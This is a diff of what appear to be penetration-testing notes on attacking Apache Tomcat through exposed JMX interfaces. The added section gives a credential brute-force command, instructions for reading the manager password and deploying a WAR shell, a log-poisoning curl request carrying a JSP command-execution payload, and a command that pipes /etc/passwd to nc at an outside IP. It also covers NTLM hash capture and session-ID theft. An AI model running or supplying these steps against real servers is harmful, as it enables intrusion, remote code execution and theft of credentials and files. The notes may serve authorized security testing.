@@ -20,13 +20,69 @@ Enumeration:
 /WEB-INF/
 /WEB-INF/web.xml
 
-
-Enumeration:
 404 "- Not Found" pages should return with Tomcat version information
-	--compare against https://wiki.apache.org/tomcat/TomcatVersions	
+	--compare against https://wiki.apache.org/tomcat/TomcatVersions
+
+8080 - default Tomcat Manager Port
 
 Target files:
 ?? $CATALINA_HOME == usr/local/tomcat
 $CATALINA_HOME/conf/tomcat-users.xml
 $CATALINA_HOME/conf/server.xml
 
+
+
+JMX
+	9999, 1099, 2001, 8009 - most common default ports for network-exposed JMX interface running on Tomcat Servers
+		--not enabled by default
+		--random high portno often also set
+	--used to monitor and manage Tomcat installations
+	jConsole (default JDK interface tool)
+	jconsole
+		--command to open jConsole interface on *nix or Win
+	JMX service configured to support auth by default
+		--when authentication is enabled auth model allows access to two different users belonging to readonly or readwrite role
+	--access is equivalent to admin/root access
+	--sensitive information, e.g. session IDs, available via JMX
+	--interacts with the server (runtime environment) via Java Remote Method Invocation (RMI) calls
+	Enumeration:
+		nmap using -sV or -A with --version-all and '--script version' flags set
+			e.g. nmap -A -sV -p 1099,8009 --script version --version-all target.dom
+		-if jconsole connection to target server fails capture packets for connection and check for an "Authentication failed! Credentials required" error message"
+			--may be followed by a partial (JRE) stack trace debugging/verbose error message in response
+			--"Invalid username or password" likely included in error message encapsulated in a following packet
+	Exploitation:
+		Brute Force
+			jmxbf
+				https://github.com/nccgroup/jmxbf
+			java -jar jmxbf.jar
+			java –jar jmxbf.jar –h 111.11.1.11 –p 1099 –uf usernames.txt –pf passwords.txt
+		(From jConsole)
+			(Read Access)
+		Users->User->”manager”->UserDatabase->Attributes
+			--read tomcat manager password
+			-from Tomcat Manager execute web application archive (.war) format shell to execute code on system
+				--on Windows this will usually run as SYSTEM or administrator
+			(Write Access, no Tomcat Manager Interface)
+		Catalina->Valve->localhost->AccessLogValve->Operations
+			--rotate function used to save Tomcat access logs to file on server
+			boolean rotate(string newFileName)
+				--possible path traversal, arbitrary file write capabilities
+			Catalina->VMSummary
+				-catalina.base property exposed
+				--returns a webapps folder which includes the various web applications served by Tomcat
+			curl 'http://target.dom/attack?<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
+				--poison Tomcat access logs with request that includes valid JSP code in the URL
+				--create a Java Servlet Page (JSP) file under a directory used by Tomcat to serve a web application
+			File can be written within catalina.base (tomcat root directory) to publicly accessible directory, e.g. as /webapps/docs/cmd.jsp
+				--target written file with rotate function
+			curl http://target.dom/docs/test.jsp?cmd=sh%20-c%20$@|sh%20.%20echo%20/bin/cat%20/etc/passwd%20|%20nc%20111.11.1.11%208080
+				--may be possible to execute wget to download, then exec more versitile JSP shell
+		SMB challenge-responses hashes
+			\\111.11.1.11\share
+				--execute as rotate function in jConsole
+			-use Metasploit SMB capture auxiliary module or Impacket equivelant to capture NTLM hash
+		Return Web Application Users' session IDs
+			Catalina->Manager->[ApplicationName]->Operations->listSessionIds()
+				--only available with write permissions
+	
